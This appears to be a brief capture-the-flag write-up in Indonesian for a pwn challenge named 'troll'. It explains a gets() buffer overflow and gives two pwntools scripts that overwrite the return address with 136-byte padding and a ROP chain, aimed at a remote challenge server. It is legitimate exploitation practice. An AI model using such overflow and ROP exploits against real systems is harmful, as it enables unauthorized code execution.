# troll

fungsi gets() terdapat vulnerability bufferoverflow. dapat dilakukan ROP ke fungsi win atau lose. pada fungsi lose, dialkukan print(“redacted”). kemungkinan flag berada disini
<br>

```
from pwn import *

r = remote('34.87.0.60', 2058)

r.sendline('ABC')

r.sendline('ABC')

p = 'A'*136

p += p64(0x0000000000401172)

r.sendline(p)

r.interactive()
```

<br>

```

from pwn import *

payload=

'a'*136+p64(0x0000000000401172)+p64(0xcafe6abe)+p64(0x0000000000401369)+p64(0xb0a75f00)+p64(0)+p64(0x0000000000

401152)


#r=process('./TrollFILE')

r=remote('34.87.0.60',2058)

#gdb.attach(r) 
print r.recv() 
r.sendline('a') 
print r.recv() 
r.sendline('a') 
print r.recv() 
r.sendline(payload) 
print r.recv() 
r.interactive()

```
